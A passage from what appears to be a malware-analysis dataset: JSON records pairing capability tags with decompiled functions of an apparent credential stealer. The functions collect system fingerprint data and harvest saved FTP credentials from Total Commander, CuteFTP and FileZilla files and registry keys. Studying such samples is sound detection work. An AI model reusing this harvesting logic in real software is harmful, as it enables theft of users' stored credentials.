return;\n}\n",
        "token_count": 740
    },
    "004040d7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004040d7(uchar *arg_8h, uint32_t *arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    uchar *puVar4;\n    uint32_t var_10h;\n    uchar *hMem;\n    uint32_t var_8h;\n    uchar *var_4h;\n    \n    uVar3 = 0;\n    var_8h = *arg_ch;\n    var_4h = arg_8h;\n    hMem = NULL;\n    if ((*0x412404 != NULL) && (arg_8h != NULL)) {\n        if (arg_10h == 0) {\n            arg_10h = 0;\n        }\n        iVar1 = (**0x412404)(&var_8h, 0, arg_10h, 0, 0, 1, &var_10h);\n        if ((iVar1 != 0) && (hMem != NULL)) {\n            if (var_10h < *arg_ch || var_10h == *arg_ch) {\n                uVar3 = 1;\n                uVar2 = var_10h;\n                puVar4 = hMem;\n                if (var_10h != 0) {\n                    for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n                        *arg_8h = *puVar4;\n                        puVar4 = puVar4 + 1;\n                        arg_8h = arg_8h + 1;\n                    }\n                }\n                *arg_ch = var_10h;\n            }\n            sub.kernel32.dll_LocalFree(hMem);\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 387
    },
    "00404165": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.00404165(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    uint uVar4;\n    int32_t var_4h;\n    \n    iVar1 = sub.kernel32.dll_GetModuleHandleA(0x412837);\n    var_4h = 0;\n    if (iVar1 != 0) {\n        iVar2 = sub.kernel32.dll_GetProcAddress(iVar1, \"GetNativeSystemInfo\");\n        if (iVar2 != 0) {\n            pcVar3 = sub.kernel32.dll_GetProcAddress(iVar1, \"IsWow64Process\");\n            if (pcVar3 != NULL) {\n                uVar4 = sub.kernel32.dll_GetCurrentProcess(&var_4h);\n                (*pcVar3)(uVar4);\n                if (var_4h != 0) {\n                    return 1;\n                }\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 205
    },
    "004041cd": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.004041cd(void)\n\n{\n    int32_t iVar1;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uchar uStack8;\n    uchar uStack7;\n    \n    if (((*0x4123bc != NULL) && (*0x4123c0 != NULL)) && (*0x4123c4 != NULL)) {\n        var_8h._0_1_ = 0;\n        var_8h._1_1_ = 0;\n        var_8h._2_1_ = 0;\n        var_8h._3_1_ = 0;\n        uStack8 = 0;\n        uStack7 = 5;\n        iVar1 = (**0x4123bc)(&var_8h, 2, 0x20, 0x220, 0, 0, 0, 0, 0, 0, &var_ch);\n        if (iVar1 == 0) {\n            return iVar1;\n        }\n        var_10h = 0;\n        iVar1 = (**0x4123c0)(0, var_ch, &var_10h);\n        if (iVar1 == 0) {\n            var_10h = 0;\n        }\n        (**0x4123c4)(var_ch);\n        return var_10h;\n    }\n    return 1;\n}\n",
        "token_count": 320
    },
    "004042f8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004042f8(uint arg_8h)\n\n{\n    bool bVar1;\n    int32_t iVar2;\n    uint uVar3;\n    code *pcVar4;\n    uint32_t uVar5;\n    uint *puVar6;\n    uint var_d4h;\n    uint var_d0h;\n    int32_t var_ach;\n    uint32_t var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_8ch;\n    uint var_4h;\n    \n    var_4h = fcn.004015a9(arg_8h, 0, 0);\n    fcn.00401522(arg_8h, 0xbeef0001);\n    fcn.004017bc(&var_a0h, 0x9c);\n    var_a0h = 0x9c;\n    iVar2 = sub.kernel32.dll_GetVersionExA(&var_a0h);\n    bVar1 = false;\n    puVar6 = &var_8ch;\n    for (uVar5 = 0; uVar5 < 0x80; uVar5 = uVar5 + 1) {\n        if (*puVar6 == '\\0') {\n            bVar1 = true;\n        }\n        if (bVar1) {\n            *puVar6 = '\\0';\n        }\n        puVar6 = puVar6 + 1;\n    }\n    if (iVar2 == 0) {\n        fcn.00401558(arg_8h, 0, 0);\n    }\n    else {\n        fcn.00401558(arg_8h, &var_a0h, 0x9c);\n    }\n    uVar3 = fcn.00404165();\n    fcn.00401522(arg_8h, uVar3);\n    var_a4h = fcn.004017a5(0x400);\n    uVar3 = sub.kernel32.dll_GetLocaleInfoA(0x400, 0x1002, var_a4h, 0x3ff);\n    fcn.00401558(arg_8h, var_a4h, uVar3);\n    uVar3 = sub.kernel32.dll_GetLocaleInfoA(0x400, 0x1001, var_a4h, 0x3ff);\n    fcn.00401558(arg_8h, var_a4h, uVar3);\n    uVar3 = fcn.004041cd();\n    fcn.00401522(arg_8h, uVar3);\n    fcn.00404267();\n    var_ach = fcn.00402619(\"HWID\", &var_a8h);\n    if ((var_ach == 0) || (var_a8h < 0x14)) {\n        fcn.00401558(arg_8h, 0, 0);\n    }\n    else {\n        var_a8h = var_a8h + 4;\n        fcn.00401522(arg_8h, var_a8h);\n        var_a8h = var_a8h - 4;\n        fcn.00401522(arg_8h, 0xffffffff);\n        fcn.00401537(arg_8h, var_ach, var_a8h);\n    }\n    fcn.0040178e(var_ach);\n    fcn.0040178e(var_a4h);\n    bVar1 = false;\n    iVar2 = sub.kernel32.dll_GetModuleHandleA(0x412837);\n    if (iVar2 != 0) {\n        pcVar4 = sub.kernel32.dll_GetProcAddress(iVar2, \"GetNativeSystemInfo\");\n        if (pcVar4 != NULL) {\n            (*pcVar4)(&var_d0h);\n            bVar1 = true;\n        }\n    }\n    if (!bVar1) {\n        sub.kernel32.dll_GetSystemInfo(&var_d0h);\n    }\n    fcn.00401558(arg_8h, &var_d0h, 0x24);\n    fcn.004015ef(arg_8h, var_4h);\n    return;\n}\n",
        "token_count": 899
    },
    "00404508": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404508(uint arg_8h, uint lpSubKey)\n\n{\n    int32_t iVar1;\n    uint var_818h;\n    int32_t var_814h;\n    int32_t var_810h;\n    uint lpValueName;\n    uint var_ch;\n    int32_t dwIndex;\n    uint phkResult;\n    \n    iVar1 = sub.advapi32.dll_RegOpenKeyA(*0x4120d5, lpSubKey, &phkResult);\n    if (iVar1 == 0) {\n        dwIndex = 0;\n        while( true ) {\n            var_ch = 0x7ff;\n            iVar1 = sub.advapi32.dll_RegEnumValueA();\n            if (iVar1 != 0) break;\n            if ((var_814h == 1) || (var_814h == 7)) {\n                iVar1 = sub.shlwapi.dll_StrStrIA(&lpValueName, \"Line\");\n                if (iVar1 != 0) {\n                    iVar1 = fcn.00401b82(*0x4120d5, lpSubKey, &lpValueName, &var_818h);\n                    if (iVar1 != 0) {\n                        var_810h = iVar1;\n                        fcn.00401522(arg_8h, 0xbeef0001);\n                        if (var_814h == 1) {\n                            fcn.00401522(arg_8h, 0);\n                        }\n                        else {\n                            fcn.00401522(arg_8h, 1);\n                        }\n                        fcn.00401558(arg_8h, var_810h, var_818h);\n                        fcn.0040178e(var_810h);\n                    }\n                }\n                dwIndex = dwIndex + 1;\n            }\n            else {\n                dwIndex = dwIndex + 1;\n            }\n        }\n        sub.advapi32.dll_RegCloseKey(phkResult);\n    }\n    return;\n}\n",
        "token_count": 427
    },
    "00404616": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404616(uint arg_8h, uint lpSubKey)\n\n{\n    int32_t iVar1;\n    uint lpString2;\n    uint arg_ch;\n    int32_t lpString;\n    int32_t lpString_00;\n    uint var_81ch;\n    uint var_818h;\n    uint var_814h;\n    uint var_810h;\n    uint lpName;\n    uint var_ch;\n    int32_t dwIndex;\n    uint phkResult;\n    \n    iVar1 = sub.advapi32.dll_RegOpenKeyA(*0x4120d5, lpSubKey, &phkResult);\n    if (iVar1 == 0) {\n        dwIndex = 0;\n        while( true ) {\n            var_ch = 0x7ff;\n            iVar1 = sub.advapi32.dll_RegEnumKeyExA(phkResult, dwIndex, &lpName, &var_ch, 0, 0, 0, 0);\n            if (iVar1 != 0) break;\n            lpString2 = fcn.00401c09(lpSubKey, 0x4120b1);\n            arg_ch = fcn.00401c09(lpString2, &lpName);\n            fcn.0040178e(lpString2);\n            iVar1 = fcn.00401b82(*0x4120d5, arg_ch, 0x41293a, 0);\n            lpString = fcn.00401b82(*0x4120d5, arg_ch, 0x412943, 0);\n            lpString_00 = fcn.00401b82(*0x4120d5, arg_ch, 0x41294c, 0);\n            if (((iVar1 != 0) && (lpString != 0)) && (lpString_00 != 0)) {\n                fcn.00401522(arg_8h, 0xbeef0000);\n                fcn.00401584(arg_8h, lpString);\n                fcn.00401584(arg_8h, lpString_00);\n                fcn.00401584(arg_8h, iVar1);\n            }\n            fcn.0040178e(iVar1);\n            fcn.0040178e(lpString);\n            fcn.0040178e(lpString_00);\n            fcn.00404616(arg_8h, arg_ch);\n            fcn.0040178e(arg_ch);\n            dwIndex = dwIndex + 1;\n        }\n        sub.advapi32.dll_RegCloseKey(phkResult);\n    }\n    return;\n}\n",
        "token_count": 564
    },
    "00404819": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404819(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint uVar3;\n    \n    if (arg_ch != 0) {\n        iVar1 = fcn.004023cb(arg_ch);\n        if (iVar1 == 0) {\n            arg_ch = fcn.00401c5d(arg_ch, 0x4120b1);\n        }\n        iVar1 = fcn.00401b82(*0x4120d5, \"Software\\\\_hisler\\\\Windows Commander\", \"FtpIniName\", 0);\n        if (iVar1 != 0) {\n            uVar2 = fcn.00401c09(arg_ch, iVar1);\n            uVar3 = arg_8h;\n            fcn.00404802(arg_8h, uVar2);\n            fcn.0040178e(uVar3);\n            fcn.0040178e(uVar3);\n        }\n        iVar1 = fcn.00401b82(0x80000002, \"Software\\\\_hisler\\\\Windows Commander\", \"FtpIniName\", 0);\n        if (iVar1 != 0) {\n            uVar2 = fcn.00401c09(arg_ch, iVar1);\n            uVar3 = arg_8h;\n            fcn.00404802(arg_8h, uVar2);\n            fcn.0040178e(uVar3);\n            fcn.0040178e(uVar3);\n        }\n        iVar1 = fcn.00401b82(*0x4120d5, \"Software\\\\_hisler\\\\Total Commander\", \"FtpIniName\", 0);\n        if (iVar1 != 0) {\n            uVar2 = fcn.00401c09(arg_ch, iVar1);\n            uVar3 = arg_8h;\n            fcn.00404802(arg_8h, uVar2);\n            fcn.0040178e(uVar3);\n            fcn.0040178e(uVar3);\n        }\n        iVar1 = fcn.00401b82(0x80000002, \"Software\\\\_hisler\\\\Total Commander\", \"FtpIniName\", 0);\n        if (iVar1 != 0) {\n            uVar2 = fcn.00401c09(arg_ch, iVar1);\n            uVar3 = arg_8h;\n            fcn.00404802(arg_8h, uVar2);\n            fcn.0040178e(uVar3);\n            fcn.0040178e(uVar3);\n        }\n        uVar3 = fcn.00401c09(arg_ch, \"_cx_ftp.ini\");\n        fcn.00404802(arg_8h, uVar3);\n        fcn.0040178e(arg_8h);\n        fcn.0040178e(arg_ch);\n    }\n    return;\n}\n",
        "token_count": 638
    },
    "00404b83": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404b83(uchar *arg_8h, char *arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uchar *hMem;\n    uint pszFirst;\n    uint lpFileName;\n    uint hFindFile;\n    uint32_t lpFindFileData;\n    uchar auStack280 [276];\n    \n    lpFileName = 0;\n    if ((arg_ch != NULL) && (*arg_ch != '\\0')) {\n        iVar1 = fcn.004023cb(arg_ch);\n        if (iVar1 == 0) {\n            lpFileName = fcn.00401c09(arg_ch, \"\\\\*.*\");\n        }\n        else {\n            lpFileName = fcn.00401c09(arg_ch, 0x4127e7);\n        }\n        fcn.004017bc(&lpFindFileData, 0x13e);\n        iVar1 = sub.kernel32.dll_FindFirstFileA(lpFileName, &lpFindFileData);\n        if (iVar1 != -1) {\n            do {\n                if ((lpFindFileData & 0x10) == 0) {\n                    hMem = auStack280;\n                    iVar2 = sub.shlwapi.dll_StrStrIA();\n                    if (iVar2 != 0) {\n                        uVar3 = fcn.00401c09(arg_ch, 0x4120b1);\n                        uVar3 = fcn.00401c5d(uVar3, auStack280);\n                        if (arg_10h == 0) {\n                            iVar2 = 1;\n                        }\n                        else {\n                            iVar2 = sub.shlwapi.dll_StrStrIA();\n                        }\n                        if (iVar2 != 0) {\n                            hMem = arg_8h;\n                            fcn.00404b6c(arg_8h, uVar3);\n                        }\n                        fcn.0040178e(hMem);\n                    }\n                }\n                else {\n                    hMem = 0x4127dd;\n                    iVar2 = sub.kernel32.dll_lstrcmpiA();\n                    if (iVar2 != 0) {\n                        hMem = 0x4127df;\n                        iVar2 = sub.kernel32.dll_lstrcmpiA();\n                        if (iVar2 != 0) {\n                            uVar3 = fcn.00401c09(arg_ch, 0x4120b1);\n                            uVar3 = fcn.00401c5d(uVar3, auStack280);\n                            hMem = arg_8h;\n                            fcn.00404b83(arg_8h, uVar3, arg_10h);\n                            fcn.0040178e(hMem);\n                        }\n                    }\n                }\n                iVar2 = sub.kernel32.dll_FindNextFileA(iVar1, &lpFindFileData, hMem);\n            } while (iVar2 != 0);\n            sub.kernel32.dll_FindClose(iVar1);\n        }\n    }\n    fcn.0040178e(lpFileName);\n    return;\n}\n",
        "token_count": 654
    },
    "00404ef3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404ef3(uint arg_8h, char *arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint var_14ch;\n    uint lpFileName;\n    uint hFindFile;\n    uint32_t lpFindFileData;\n    uchar auStack280 [276];\n    \n    lpFileName = 0;\n    if ((arg_ch != NULL) && (*arg_ch != '\\0')) {\n        uVar1 = fcn.00401c09(arg_ch, arg_10h);\n        uVar4 = arg_8h;\n        fcn.00404e92(arg_8h, uVar1);\n        fcn.0040178e(uVar4);\n        lpFileName = fcn.00401c09(arg_ch, \"\\\\*.*\");\n        uVar4 = 0x13e;\n        fcn.004017bc(&lpFindFileData, 0x13e);\n        iVar2 = sub.kernel32.dll_FindFirstFileA(lpFileName, &lpFindFileData);\n        if (iVar2 != -1) {\n            do {\n                if ((lpFindFileData & 0x10) != 0) {\n                    uVar4 = 0x4127dd;\n                    iVar3 = sub.kernel32.dll_lstrcmpiA();\n                    if (iVar3 != 0) {\n                        uVar4 = 0x4127df;\n                        iVar3 = sub.kernel32.dll_lstrcmpiA();\n                        if (iVar3 != 0) {\n                            uVar4 = fcn.00401c09(arg_ch, 0x4120b1);\n                            uVar4 = fcn.00401c5d(uVar4, auStack280);\n                            uVar1 = fcn.00401c5d(uVar4, arg_10h);\n                            uVar4 = arg_8h;\n                            fcn.00404e92(arg_8h, uVar1);\n                            fcn.0040178e(uVar4);\n                        }\n                    }\n                }\n                iVar3 = sub.kernel32.dll_FindNextFileA(iVar2, &lpFindFileData, uVar4);\n            } while (iVar3 != 0);\n            sub.kernel32.dll_FindClose(iVar2);\n        }\n    }\n    fcn.0040178e(lpFileName);\n    return;\n}\n",
        "token_count": 521
    },
    "004050d3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004050d3(uint arg_8h)\n\n{\n    char cVar1;\n    uint arg_ch;\n    int32_t iVar2;\n    char *pcVar3;\n    char *lpString;\n    uint hMem;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 4, 0);\n    cVar1 = **0x412059;\n    lpString = *0x412059;\n    do {\n        if (cVar1 == '\\0') {\n            fcn.0040502a(arg_8h, 0x1a);\n            fcn.0040502a(arg_8h, 0x23);\n            fcn.0040502a(arg_8h, 0x1c);\n            fcn.0040502a(arg_8h, 0x26);\n            fcn.00404ea9(arg_8h, \"Software\\\\GlobalSCAPE\\\\CuteFTP 6 Home\\\\QCToolbar\");\n            fcn.00404ea9(arg_8h, \"Software\\\\GlobalSCAPE\\\\CuteFTP 6 Professional\\\\QCToolbar\");\n            fcn.00404ea9(arg_8h, \"Software\\\\GlobalSCAPE\\\\CuteFTP 7 Home\\\\QCToolbar\");\n            fcn.00404ea9(arg_8h, \"Software\\\\GlobalSCAPE\\\\CuteFTP 7 Professional\\\\QCToolbar\");\n            fcn.00404ea9(arg_8h, \"Software\\\\GlobalSCAPE\\\\CuteFTP 8 Home\\\\QCToolbar\");\n            fcn.00404ea9(arg_8h, \"Software\\\\GlobalSCAPE\\\\CuteFTP 8 Professional\\\\QCToolbar\");\n            fcn.00404ea9(arg_8h, \"Software\\\\GlobalSCAPE\\\\CuteFTP 9\\\\QCToolbar\");\n            fcn.004015ef(arg_8h, arg_ch);\n            return;\n        }\n        iVar2 = sub.shlwapi.dll_StrStrIA();\n        if ((iVar2 != 0) && (iVar2 = fcn.0040223e(lpString),  iVar2 != 0)) {\n            hMem = arg_8h;\n            fcn.00404ef3(arg_8h, iVar2, \"\\\\sm.dat\");\n            fcn.0040178e(hMem);\n        }\n        iVar2 = -1;\n        pcVar3 = lpString;\n        do {\n            lpString = pcVar3;\n            if (iVar2 == 0) break;\n            iVar2 = iVar2 + -1;\n            lpString = pcVar3 + 1;\n            cVar1 = *pcVar3;\n            pcVar3 = lpString;\n        } while (cVar1 != '\\0');\n        cVar1 = *lpString;\n    } while( true );\n}\n",
        "token_count": 626
    },
    "004051c2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004051c2(uint arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    if (arg_ch != 0) {\n        fcn.00403d67(arg_8h, arg_ch, arg_10h);\n        fcn.0040178e(arg_ch);\n    }\n    return;\n}\n",
        "token_count": 78
    },
    "004054e0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004054e0(uint arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    uint uVar2;\n    \n    if (arg_ch != 0) {\n        uVar1 = fcn.00401c09(arg_ch, \"\\\\sitemanager.xml\");\n        uVar2 = arg_8h;\n        fcn.00403d67(arg_8h, uVar1, 0xbeef0000);\n        fcn.0040178e(uVar2);\n        uVar1 = fcn.00401c09(arg_ch, \"\\\\recentservers.xml\");\n        uVar2 = arg_8h;\n        fcn.00403d67(arg_8h, uVar1, 0xbeef0001);\n        fcn.0040178e(uVar2);\n        uVar2 = fcn.00401c09(arg_ch, \"\\\\filezilla.xml\");\n        fcn.00403d67(arg_8h, uVar2, 0xbeef0002);\n        fcn.0040178e(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 244
    },
    "0040557d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.0040557d(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h, int32_t arg_28h)\n\n{\n    int32_t var_20h;\n    uint *var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_ch = fcn.00401b82(*0x4120d5, arg_ch, arg_10h, 0);\n    var_4h = fcn.00401b82(*0x4120d5, arg_ch, arg_14h, 0);\n    var_8h = fcn.00401b82(*0x4120d5, arg_ch, arg_18h, 0);\n    var_10h = fcn.00401b82(*0x4120d5, arg_ch, arg_1ch, &var_18h);\n    var_14h = fcn.00401b82(*0x4120d5, arg_ch, arg_20h, 0);\n    var_1ch = fcn.00401b82(*0x4120d5, arg_ch, arg_24h, &var_20h);\n    if (((var_4h != 0) && (var_8h != 0)) && (var_ch != 0)) {\n        fcn.00401522(arg_8h, arg_28h);\n        fcn.00401584(arg_8h, var_4h);\n        fcn.00401584(arg_8h, var_8h);\n        fcn.00401584(arg_8h, var_ch);\n        if (arg_28h == -0x4110ffed) {\n            fcn.00401584(arg_8h, var_10h);\n        }\n        else {\n            fcn.00401558(arg_8h, var_10h, var_18h);\n        }\n        fcn.00401584(arg_8h, var_14h);\n        if ((var_1ch == NULL) || (var_20h != 4)) {\n            fcn.00401522(arg_8h, 0);\n        }\n        else {\n            fcn.00401522(arg_8h, *var_1ch);\n        }\n    }\n    fcn.0040178e(var_ch);\n    fcn.0040178e(var_4h);\n    fcn.0040178e(var_8h);\n    fcn.0040178e(var_10h);\n    fcn.0040178e(var_14h);\n    fcn.0040178e(var_1ch);\n    return;\n}\n",
        "token_count": 647
    },
    "004058f9": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.004058f9(char *arg_8h)\n\n{\n    char cVar1;\n    char *arg_8h_00;\n    int32_t iVar2;\n    uint uVar3;\n    char *lpString;\n    char *pcVar4;\n    char *pcVar5;\n    char *var_4h;\n    \n    var_4h = fcn.004015a9(arg_8h, 7, 0);\n    cVar1 = **0x41205d;\n    lpString = *0x412059;\n    arg_8h_00 = *0x41205d;\n    do {\n        if (cVar1 == '\\0') {\n            fcn.004015ef(arg_8h, var_4h);\n            return;\n        }\n        iVar2 = sub.shlwapi.dll_StrStrIA();\n        if (iVar2 != 0) {\n            uVar3 = fcn.0040223e(lpString);\n            fcn.0040404c(arg_8h_00, uVar3, 0x412dcf, 0xbeef0000);\n            fcn.0040178e(arg_8h_00);\n        }\n        var_4h = 0x40595a;\n        iVar2 = sub.shlwapi.dll_StrStrIA();\n        if (iVar2 != 0) {\n            uVar3 = fcn.0040223e(lpString);\n            pcVar4 = arg_8h_00;\n            fcn.0040404c(arg_8h_00, uVar3, 0x412dcf, 0xbeef0000);\n            fcn.0040178e(pcVar4);\n            var_4h = lpString;\n        }\n        for (; *lpString != '\\0'; lpString = lpString + 1) {\n        }\n        lpString = lpString + 1;\n        iVar2 = -1;\n        pcVar4 = arg_8h_00;\n        do {\n            pcVar5 = pcVar4;\n            if (iVar2 == 0) break;\n            iVar2 = iVar2 + -1;\n            pcVar5 = pcVar4 + 1;\n            cVar1 = *pcVar4;\n            pcVar4 = pcVar5;\n        } while (cVar1 != '\\0');\n        cVar1 = *pcVar5;\n        arg_8h = arg_8h_00;\n        arg_8h_00 = pcVar5;\n    } while( true );\n}\n",
        "token_count": 565
    },
    "00405c93": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405c93(uint arg_8h, uint lpSubKey)\n\n{\n    int32_t iVar1;\n    uint lpString2;\n    uint *hMem;\n    int32_t var_828h;\n    uint var_824h;\n    uint var_820h;\n    int32_t var_81ch;\n    int32_t var_818h;\n    int32_t var_814h;\n    uint var_810h;\n    uint lpName;\n    uint var_ch;\n    int32_t dwIndex;\n    uint phkResult;\n    \n    iVar1 = sub.advapi32.dll_RegOpenKeyA(*0x4120d5, lpSubKey, &phkResult);\n    if (iVar1 == 0) {\n        dwIndex = 0;\n        while( true ) {\n            var_ch = 0x7ff;\n            iVar1 = sub.advapi32.dll_RegEnumKeyExA(phkResult, dwIndex, &lpName, &var_ch, 0, 0, 0, 0);\n            if (iVar1 != 0) break;\n            lpString2 = fcn.00401c09(lpSubKey, 0x4120b1);\n            var_810h = fcn.00401c09(lpString2, &lpName);\n            fcn.0040178e(lpString2);\n            var_81ch = fcn.00401b82(*0x4120d5, var_810h, 0x412fa8, 0);\n            var_814h = fcn.00401b82(*0x4120d5, var_810h, \"HostAdrs\", 0);\n            var_818h = fcn.00401b82(*0x4120d5, var_810h, 0x412fb1, 0);\n            var_820h = fcn.00401b82(*0x4120d5, var_810h, \"RemoteDir\", 0);\n            hMem = fcn.00401b82(*0x4120d5, var_810h, 0x412fcd, &var_828h);\n            if ((hMem == NULL) || (var_828h != 4)) {\n                if (hMem != NULL) {\n                    fcn.0040178e(hMem);\n                }\n                var_824h = 0x15;\n            }\n            else {\n                var_824h = *hMem;\n                fcn.0040178e(hMem);\n            }\n            if (((var_81ch != 0) && (var_814h != 0)) && (var_818h != 0)) {\n                fcn.00401522(arg_8h, 0xbeef0000);\n                fcn.00401584(arg_8h, var_814h);\n                fcn.00401584(arg_8h, var_818h);\n                fcn.00401584(arg_8h, var_81ch);\n                fcn.00401584(arg_8h, var_820h);\n                fcn.00401522(arg_8h, var_824h);\n            }\n            fcn.0040178e(var_81ch);\n            fcn.0040178e(var_814h);\n            fcn.0040178e(var_818h);\n            fcn.0040178e(var_820h);\n            fcn.0040178e(var_810h);\n            dwIndex = dwIndex + 1;\n        }\n        sub.advapi32.dll_RegCloseKey(phkResult);\n    }\n    return;\n}\n",
        "token_count": 785
    },
    "00405f2b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405f2b(uint arg_8h, uint lpSubKey)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint arg_ch;\n    int32_t lpString;\n    int32_t lpString_00;\n    uint lpString_01;\n    uint var_824h;\n    uint var_820h;\n    uint var_81ch;\n    uint var_818h;\n    uint var_814h;\n    uint var_810h;\n    uint lpName;\n    uint var_ch;\n    int32_t dwIndex;\n    uint phkResult;\n    \n    iVar1 = sub.advapi32.dll_RegOpenKeyA(*0x4120d5, lpSubKey, &phkResult);\n    if (iVar1 == 0) {\n        dwIndex = 0;\n        while( true ) {\n            var_ch = 0x7ff;\n            iVar1 = sub.advapi32.dll_RegEnumKeyExA(phkResult, dwIndex, &lpName, &var_ch, 0, 0, 0, 0);\n            if (iVar1 != 0) break;\n            uVar2 = fcn.00401c09(lpSubKey, 0x4120b1);\n            arg_ch = fcn.00401c09(uVar2, &lpName);\n            fcn.0040178e(uVar2);\n            iVar1 = fcn.00401b82(*0x4120d5, arg_ch, 0x412fe9, 0);\n            lpString = fcn.00401b82(*0x4120d5, arg_ch, 0x412fd2, 0);\n            uVar2 = fcn.00401b82(*0x4120d5, arg_ch, 0x412fdb, 0);\n    